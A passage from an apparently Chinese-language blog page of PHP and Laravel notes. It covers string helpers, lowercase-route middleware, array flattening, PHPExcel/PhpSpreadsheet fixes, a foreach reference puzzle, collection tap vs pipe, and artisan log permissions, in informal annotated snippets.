class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在给定值后返回字符串的其余部分。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params">$subject, $search</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        dump(explode($search, $subject, <span class="number">2</span>),array_reverse(explode($search, $subject, <span class="number">2</span>)));</span><br><span class="line">        <span class="comment">//array:2 [▼</span></span><br><span class="line">            <span class="number">0</span> =&gt; <span class="string">""</span></span><br><span class="line">            <span class="number">1</span> =&gt; <span class="string">"试laravel函数"</span></span><br><span class="line">          ]</span><br><span class="line">          array:<span class="number">2</span> [▼</span><br><span class="line">            <span class="number">0</span> =&gt; <span class="string">"试laravel函数"</span></span><br><span class="line">            <span class="number">1</span> =&gt; <span class="string">""</span></span><br><span class="line">          ]</span><br><span class="line">        <span class="keyword">return</span> $search === <span class="string">''</span> ? $subject : array_reverse(explode($search, $subject, <span class="number">2</span>))[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">$s = <span class="string">'测试laravel函数'</span>;echo after($s,<span class="string">'测'</span>);<span class="comment">//试laravel函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ascii</span>(<span class="params">$value, $language = <span class="string">'en'</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $languageSpecific = languageSpecificCharsArray($language);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! is_null($languageSpecific)) &#123;</span><br><span class="line">            $value = str_replace($languageSpecific[<span class="number">0</span>], $languageSpecific[<span class="number">1</span>], $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        foreach ( charsArray() <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $value = str_replace($val, $key, $value);<span class="comment">//循环将数组内的字符串替换</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">'/[^\x20-\x7E]/u'</span>, <span class="string">''</span>, $value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">languageSpecificCharsArray</span>(<span class="params">$language</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $languageSpecific;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! isset($languageSpecific)) &#123;</span><br><span class="line">            $languageSpecific = [</span><br><span class="line">                <span class="string">'bg'</span> =&gt; [</span><br><span class="line">                    [<span class="string">'х'</span>, <span class="string">'Х'</span>, <span class="string">'щ'</span>, <span class="string">'Щ'</span>, <span class="string">'ъ'</span>, <span class="string">'Ъ'</span>, <span class="string">'ь'</span>, <span class="string">'Ь'</span>],</span><br><span class="line">                    [<span class="string">'h'</span>, <span class="string">'H'</span>, <span class="string">'sht'</span>, <span class="string">'SHT'</span>, <span class="string">'a'</span>, <span class="string">'А'</span>, <span class="string">'y'</span>, <span class="string">'Y'</span>],</span><br><span class="line">                ],</span><br><span class="line">                <span class="string">'de'</span> =&gt; [</span><br><span class="line">                    [<span class="string">'ä'</span>,  <span class="string">'ö'</span>,  <span class="string">'ü'</span>,  <span class="string">'Ä'</span>,  <span class="string">'Ö'</span>,  <span class="string">'Ü'</span>],</span><br><span class="line">                    [<span class="string">'ae'</span>, <span class="string">'oe'</span>, <span class="string">'ue'</span>, <span class="string">'AE'</span>, <span class="string">'OE'</span>, <span class="string">'UE'</span>],</span><br><span class="line">                ],</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $languageSpecific[$language] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">charsArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $charsArray;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($charsArray)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $charsArray;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $charsArray = [</span><br><span class="line">            <span class="string">'0'</span>    =&gt; [<span class="string">'°'</span>, <span class="string">'₀'</span>, <span class="string">'۰'</span>, <span class="string">'０'</span>],</span><br><span class="line">            <span class="string">'1'</span>    =&gt; [<span class="string">'¹'</span>, <span class="string">'₁'</span>, <span class="string">'۱'</span>, <span class="string">'１'</span>],</span><br><span class="line">            <span class="string">'2'</span>    =&gt; [<span class="string">'²'</span>, <span class="string">'₂'</span>, <span class="string">'۲'</span>, <span class="string">'２'</span>],</span><br><span class="line">            <span class="string">'3'</span>    =&gt; [<span class="string">'³'</span>, <span class="string">'₃'</span>, <span class="string">'۳'</span>, <span class="string">'３'</span>],</span><br><span class="line">            <span class="string">'4'</span>    =&gt; [<span class="string">'⁴'</span>, <span class="string">'₄'</span>, <span class="string">'۴'</span>, <span class="string">'٤'</span>, <span class="string">'４'</span>],</span><br><span class="line">            <span class="string">'5'</span>    =&gt; [<span class="string">'⁵'</span>, <span class="string">'₅'</span>, <span class="string">'۵'</span>, <span class="string">'٥'</span>, <span class="string">'５'</span>],</span><br><span class="line">            <span class="string">'6'</span>    =&gt; [<span class="string">'⁶'</span>, <span class="string">'₆'</span>, <span class="string">'۶'</span>, <span class="string">'٦'</span>, <span class="string">'６'</span>],</span><br><span class="line">            <span class="string">'7'</span>    =&gt; [<span class="string">'⁷'</span>, <span class="string">'₇'</span>, <span class="string">'۷'</span>, <span class="string">'７'</span>],</span><br><span class="line">            <span class="string">'8'</span>    =&gt; [<span class="string">'⁸'</span>, <span class="string">'₈'</span>, <span class="string">'۸'</span>, <span class="string">'８'</span>],</span><br><span class="line">            <span class="string">'9'</span>    =&gt; [<span class="string">'⁹'</span>, <span class="string">'₉'</span>, <span class="string">'۹'</span>, <span class="string">'９'</span>],</span><br><span class="line">            &#125;</span><br><span class="line"> 将utf - <span class="number">8</span>值转换为ASCII           </span><br><span class="line">ascii($s);<span class="comment">//laravel</span></span><br><span class="line"><span class="comment">//在给定值之前获取字符串的部分。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params">$subject, $search</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $search === <span class="string">''</span> ? $subject : explode($search, $subject)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//将一个值转换为一个大写的大写字母</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">studly</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">                 $key = $value;</span><br><span class="line"> </span><br><span class="line">                 <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$studlyCache[$key])) &#123;</span><br><span class="line">                         <span class="keyword">return</span> <span class="keyword">static</span>::$studlyCache[$key];</span><br><span class="line">                 &#125;</span><br><span class="line"> </span><br><span class="line">                 $value = ucwords(str_replace([<span class="string">'-'</span>, <span class="string">'_'</span>], <span class="string">' '</span>, $value));</span><br><span class="line"> </span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">static</span>::$studlyCache[$key] = str_replace(<span class="string">' '</span>, <span class="string">''</span>, $value);</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
<h3 id="路由为不区分大小写"><a href="#路由为不区分大小写" class="headerlink" title="路由为不区分大小写"></a>路由为不区分大小写</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">添加中间件. LowerCaseRoutes</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Http\Middleware;</span><br><span class="line"></span><br><span class="line">use Closure;</span><br><span class="line">use \Illuminate\Support\Facades\Redirect;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把大写uri转换为小写.已经实现路由不区分大小写，如果有大写，会 301 跳转到小写的地址.</span></span><br><span class="line"><span class="comment">               </span></span><br><span class="line"><span class="comment">https://learnku.com/laravel/t/27783</span></span><br><span class="line"><span class="comment"> * Class LowerCaseRoutes</span></span><br><span class="line"><span class="comment"> * @package App\Http\Middleware</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LowerCaseRoutes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle an incoming request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param  \Illuminate\Http\Request  $request</span></span><br><span class="line"><span class="comment">     * @param  \Closure  $next</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">$request, Closure $next</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/([A-Z]+)/'</span>, $request-&gt;path(), $match)) &#123;</span><br><span class="line">            $newRoute = str_replace($request-&gt;path(), strtolower($request-&gt;path()), $request-&gt;fullUrl());</span><br><span class="line">            <span class="keyword">return</span> Redirect::to($newRoute, <span class="number">301</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $next($request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数组扁平化"><a href="#数组扁平化" class="headerlink" title="数组扁平化"></a>数组扁平化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$data = [</span><br><span class="line">    <span class="string">'testArray'</span> =&gt; [</span><br><span class="line">        <span class="string">'string1'</span>,</span><br><span class="line">        <span class="string">'string2'</span>,</span><br><span class="line">        [</span><br><span class="line">            <span class="string">'string1'</span>,</span><br><span class="line">            <span class="string">'string2'</span>,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'teststring'</span></span><br><span class="line">];</span><br><span class="line">echo <span class="string">"&lt;pre&gt;"</span>;https:<span class="comment">//learnku.com/articles/24318</span></span><br><span class="line"></span><br><span class="line">print_r(iterator_to_array(</span><br><span class="line">        <span class="keyword">new</span> RecursiveIteratorIterator(</span><br><span class="line">            <span class="keyword">new</span> RecursiveArrayIterator($data)</span><br><span class="line">        ),</span><br><span class="line">        <span class="literal">false</span>  <span class="comment">// use_keys:默认true</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; string1</span></span><br><span class="line"><span class="comment">    [1] =&gt; string2</span></span><br><span class="line"><span class="comment">    [2] =&gt; string1</span></span><br><span class="line"><span class="comment">    [3] =&gt; string2</span></span><br><span class="line"><span class="comment">    [4] =&gt; teststring</span></span><br><span class="line"><span class="comment">)*/</span></span><br><span class="line">collect ($data)-&gt;flatten ()-&gt;all ()</span><br></pre></td></tr></table></figure>
<h3 id="phpexcel科学计数法"><a href="#phpexcel科学计数法" class="headerlink" title="phpexcel科学计数法"></a>phpexcel科学计数法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">拼一个 \t</span><br><span class="line">设置单元格格式为文本格式https:<span class="comment">//learnku.com/articles/23696</span></span><br><span class="line"></span><br><span class="line">          $card_no_style = [</span><br><span class="line">                        <span class="string">'numberFormat'</span> =&gt; [</span><br><span class="line">                            <span class="string">'formatCode'</span> =&gt; NumberFormat::FORMAT_TEXT</span><br><span class="line">                        ]</span><br><span class="line"></span><br><span class="line">                    ];</span><br><span class="line">                    $obj_sheet-&gt;getStyle(Coordinate::stringFromColumnIndex($column) . <span class="string">"1"</span> . <span class="string">":"</span> . Coordinate::stringFromColumnIndex($column) . count($data))-&gt;applyFromArray($card_no_style);</span><br></pre></td></tr></table></figure>
<h3 id="PHPExcel-在-PHP7-0-以上版本报错"><a href="#PHPExcel-在-PHP7-0-以上版本报错" class="headerlink" title="PHPExcel 在 PHP7.0 以上版本报错"></a>PHPExcel 在 PHP7.0 以上版本报错</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'break'</span> not <span class="keyword">in</span> the <span class="string">'loop'</span> or <span class="string">'switch'</span> context</span><br><span class="line"></span><br><span class="line">PHPExcel\Calculation\Functions.php 　LINE: <span class="number">581</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (($value === NULL) || (is_float($value)) || (is_int($value))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; elseif(is_bool($value)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">        &#125; elseif(is_array($value)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">64</span>;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//这是581行</span></span><br><span class="line">        &#125; elseif(is_string($value)) &#123;</span><br><span class="line">            <span class="comment">//  Errors</span></span><br><span class="line">            <span class="keyword">if</span> ((strlen($value) &gt; <span class="number">0</span>) &amp;&amp; ($value&#123;<span class="number">0</span>&#125; == <span class="string">'#'</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">         <span class="keyword">return</span> 跳出当前函数或者循环直接返回 <span class="keyword">break</span> 并会执行而报错https:<span class="comment">//learnku.com/articles/26675</span></span><br><span class="line">        </span><br><span class="line">        方案 <span class="number">1</span>: 将 <span class="number">581</span> 行的 <span class="keyword">break</span> 注释掉</span><br><span class="line">        </span><br><span class="line">        方案 <span class="number">2</span> : 将 PHPExcel 升级到 <span class="number">1.81</span> 版本以上</span><br><span class="line">        </span><br><span class="line">        方案三：使用 PHPExcel 的升级产品 PhpSpreadsheet</span><br><span class="line">        </span><br><span class="line">        方案 <span class="number">1</span> 修改源码 不推荐</span><br><span class="line">        方案 <span class="number">2</span>PHPExcel 已不再维护 故不推荐</span><br><span class="line">        对于框架版本国过老 或经多手的项目 建议使用 方案 <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">        </span><br><span class="line">        方案 <span class="number">3</span> 为 PHPExcel 的替代品升级产品 而且在维护 新项目推荐方案 <span class="number">3</span></span><br><span class="line">        </span><br><span class="line">        PHPExcel <span class="number">1.8</span><span class="number">.1</span> 地址 https:<span class="comment">//github.com/PHPOffice/PHPExcel/commit/372c7cbb695a6f6f1e62649381aeaa37e7e70b32</span></span><br><span class="line">        </span><br><span class="line">        PhpSpreadsheet 安装 如下</span><br><span class="line">        </span><br><span class="line">        文档地址：https:<span class="comment">//phpspreadsheet.readthedocs.io/en/latest/#getting-started</span></span><br><span class="line">        </span><br><span class="line">        GitHub 下载：https:<span class="comment">//github.com/PHPOffice/PhpSpreadsheet</span></span><br><span class="line">        </span><br><span class="line">        composer 安装：composer <span class="built_in">require</span> phpoffice/phpspreadsheet</span><br><span class="line">        </span><br><span class="line">        PHPExcel 与 PhpSpreadsheet？</span><br><span class="line">        </span><br><span class="line">        PhpSpreadsheet 是 PHPExcel 的下一个版本。它打破了兼容性，大大提高了代码库质量（命名空间，PSR 合规性，最新 PHP 语言功能的使用等）。</span><br><span class="line">        </span><br><span class="line">        因为所有的努力都转移到了 PhpSpreadsheet，所以不再维护 PHPExcel。PHPExcel，补丁和新功能的所有贡献都应该以 PhpSpreadsheet master 分支为目标。</span><br></pre></td></tr></table></figure>
<h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$data=array(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>);</span><br><span class="line">  foreach($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">       $value=&amp;$data[$key];</span><br><span class="line">  &#125;</span><br><span class="line">问题<span class="number">1</span>:程序执行时，每一次循环结束后变量$data的值是什么？请解释。</span><br><span class="line">问题<span class="number">2</span>:程序执行完后，变量$data的值是什么？请解释。</span><br><span class="line"><span class="comment">//第一次遍历 结果还是 【a,b,c】</span></span><br><span class="line"><span class="comment">//第二次遍历</span></span><br><span class="line">$data[<span class="number">0</span>]=<span class="string">'a'</span>;<span class="comment">//第一次遍历的时候$data[0]=a</span></span><br><span class="line">$val=&amp;$data[<span class="number">0</span>];<span class="comment">//这边已经把$data[0]引用指向$val 第一次遍历以后</span></span><br><span class="line">$val=b <span class="comment">//现在$val 一旦变了 那么$data[0]也就改变了 所以变成$data[0]=b</span></span><br><span class="line">$data=[b,b,c];<span class="comment">//最后结果变成了</span></span><br><span class="line"><span class="comment">//第三次遍历</span></span><br><span class="line">$data[<span class="number">1</span>]=b;<span class="comment">//第二次遍历的时候$data[1]变成了b</span></span><br><span class="line">$val=&amp;$data[<span class="number">1</span>];<span class="comment">//第二次遍历的时候$val的引用变成了$data[1]</span></span><br><span class="line">$val=c;<span class="comment">//所以这边$val变成了c 那么$data[1]也就变成了c</span></span><br><span class="line">$data=[<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'c'</span>]<span class="comment">//最后结果变成了</span></span><br><span class="line"><span class="comment">//最后的$data的结果https://learnku.com/articles/26374</span></span><br><span class="line">【b,c,c】</span><br><span class="line">list($b, $a) = array($a, $b);</span><br></pre></td></tr></table></figure>
<h3 id="tap"><a href="#tap" class="headerlink" title="tap"></a>tap</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$items = [</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'David Charleston'</span>, <span class="string">'member'</span> =&gt; <span class="number">1</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Blain Charleston'</span>, <span class="string">'member'</span> =&gt; <span class="number">0</span>, <span class="string">'active'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Megan Tarash'</span>, <span class="string">'member'</span> =&gt; <span class="number">1</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Jonathan Phaedrus'</span>, <span class="string">'member'</span> =&gt; <span class="number">1</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Paul Jackson'</span>, <span class="string">'member'</span> =&gt; <span class="number">0</span>, <span class="string">'active'</span> =&gt; <span class="number">1</span>]</span><br><span class="line">];</span><br><span class="line">先将数组转为集合，再进行数据的过滤，最后在两个不同的节点调用 tap 方法，返回打印结果：</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> collect($items)</span><br><span class="line">    -&gt;where(<span class="string">'active'</span>, <span class="number">1</span>)</span><br><span class="line">    -&gt;tap(<span class="function"><span class="keyword">function</span>(<span class="params">$collection</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> var_dump($collection-&gt;pluck(<span class="string">'name'</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">    -&gt;where(<span class="string">'member'</span>, <span class="number">1</span>)</span><br><span class="line">    -&gt;tap(<span class="function"><span class="keyword">function</span>(<span class="params">$collection</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> var_dump($collection-&gt;pluck(<span class="string">'name'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">第一次调用 tap 方法输出结果：https:<span class="comment">//learnku.com/laravel/t/26361</span></span><br><span class="line"></span><br><span class="line">David Charleston, Megan Tarash, Jonathan Phaedrus, Paul Jackson</span><br><span class="line">第二次调用 tap 方法输出结果：</span><br><span class="line"></span><br><span class="line">David Charleston, Megan Tarash, Jonathan Phaedrus</span><br><span class="line">Tap vs Pipe</span><br><span class="line"></span><br><span class="line">Laravel 也提供了另一个类似 tap 的集合操作方法 -- pipe，两者在集合调用上很类似，却有一个主要的区别：</span><br><span class="line"></span><br><span class="line">通过调用 tap 方法不会改变原集合的结果，而 pipe 方法会根据返回值修改元集合的结果。示例如下：</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> collect($items)</span><br><span class="line">    -&gt;where(<span class="string">'active'</span>, <span class="number">1</span>)</span><br><span class="line">    -&gt;pipe(<span class="function"><span class="keyword">function</span> (<span class="params">$collection</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $collection-&gt;push([<span class="string">'name'</span> =&gt; <span class="string">'John Doe'</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="comment">// David Charleston, Megan Tarash, Jonathan Phaedrus, Paul Jackson, John Doe</span></span><br></pre></td></tr></table></figure>
<h3 id="artisan日志-root-权限解决"><a href="#artisan日志-root-权限解决" class="headerlink" title="artisan日志 root 权限解决"></a>artisan日志 root 权限解决</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bootstrap/app.php 中写入以下配置： </span><br><span class="line">https:<span class="comment">//learnku.com/articles/26444</span></span><br><span class="line">$app-&gt;configureMonologUsing(<span class="function"><span class="keyword">function</span>(<span class="params">Monolog\Logger $monolog</span>) </span>&#123;</span><br><span class="line">    $filename = storage_path(<span class="string">'logs/laravel-'</span>.php_sapi_name().<span class="string">'.log'</span>);</span><br><span class="line">    $handler = <span class="keyword">new</span> Monolog\Handler\RotatingFileHandler($filename);</span><br><span class="line">    $monolog-&gt;pushHandler($handler);</span><br><span class="line">&#125;);</span><br><span class="line">正确的做法应该是用 www 用户执行 artisan 命令，因为不光是日志，还有可能有缓存、 storage 等文件可能被 root 用户创建而导致 www 用户无权操作。</span><br><span class="line">脚本写在 crontab 中的，如果我想用 www 用户执行 artisan 命令，我应该怎么写 crontab 呢 crontab -e -u www</span><br><span class="line">php cli 或者 fpm 都是用 www 用户去执行 就不会出现你这个问题的</span><br><span class="line">不想使用单独的用户配置 crontab，也可以这么干，比如：配置在 root 账号下</span><br><span class="line"></span><br><span class="line">su www -s /bin/bash -c “php artisan schedule:run”</span><br></pre></td></tr></table></figure>
<h3 id="英文字符占-0-5-个，中文字符占-1-个"><a href="#英文字符占-0-5-个，中文字符占-1-个" class="headerlink" title="英文字符占 0.5 个，中文字符占 1 个"></a>英文字符占 0.5 个，中文字符占 1 个</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/4956/following-my-unique-needs-of-the-english-characters-accounted-for-05-chinese-characters-accounted-for-1#topnav</span></span><br><span class="line">$double = str_word_count(preg_replace(<span class="string">'([a-zA-Z0-9_])'</span>, <span class="string">''</span>, $value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算单字节.</span></span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z0-9_]/'</span>, $value, $single);</span><br><span class="line">    $single = count($single[<span class="number">0</span>]) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 多子节长度.</span></span><br><span class="line">    $double = mb_strlen(preg_replace(<span class="string">'([a-zA-Z0-9_])'</span>, <span class="string">''</span>, $value));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">the_fucking_length_function</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen(mb_convert_encoding($str, <span class="string">'GB2312'</span>)) / <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">$length = (strlen($value) + mb_strlen($value)) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">//这个方法是好的，缺点就只有一个，就是精度问题，因为 utf-8 中只有两万多个汉字是 3 字节，还有六万多的不常用汉字是 4 字节的，附带 emoji 之类的就</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">mbstrlen</span>(<span 